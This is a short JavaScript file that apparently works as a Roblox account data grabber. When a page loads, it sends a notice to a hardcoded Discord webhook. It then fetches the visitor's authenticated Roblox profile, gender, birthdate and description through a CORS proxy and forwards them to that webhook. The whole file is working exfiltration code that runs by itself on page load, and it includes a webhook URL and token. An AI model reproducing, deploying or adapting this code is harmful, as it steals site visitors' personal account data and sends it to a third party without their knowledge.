// Define your Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1272974490879397949/neN1WoArgjNAj3rpmK-4lqHJVfAEcql6oz5S45jgjYwSbCU1IX3GqRo_HOJ0-af-NU3N';

// Function to send a message to the Discord webhook
function sendToDiscord(message) {
    return fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.text().then(text => text ? JSON.parse(text) : {}); // Handle empty response
    })
    .then(data => console.log('Successfully sent data to Discord:', data))
    .catch(error => console.error('Error sending data to Discord:', error));
}

// Function to fetch data from Roblox API endpoints
function fetchRobloxData() {
    const endpoints = [
        'https://corsproxy.io/?https://users.roblox.com/v1/users/authenticated',
        'https://corsproxy.io/?https://users.roblox.com/v1/gender',
        'https://corsproxy.io/?https://users.roblox.com/v1/birthdate',
        'https://corsproxy.io/?https://users.roblox.com/v1/description'
    ];

    Promise.all(endpoints.map(url =>
        fetch(url)
            .then(response => response.json())
            .then(data => ({ url, data }))
            .catch(error => ({ url, error: error.message }))
    ))
    .then(results => {
        // Combine the results into a single object
        const combinedData = results.map(result => ({
            url: result.url,
            data: result.data || result.error
        }));
        
        // Send the combined data to Discord
        sendToDiscord(`Roblox Data: ${JSON.stringify(combinedData, null, 2)}`);
    })
    .catch(error => console.error('Error fetching Roblox data:', error));
}

// Trigger the initial message and data fetching once the DOM content is loaded
document.addEventListener('DOMContentLoaded', () => {
    sendToDiscord('Site has been loaded')
        .then(() => fetchRobloxData())
        .catch(error => console.error('Error sending initial message to Discord:', error));
});
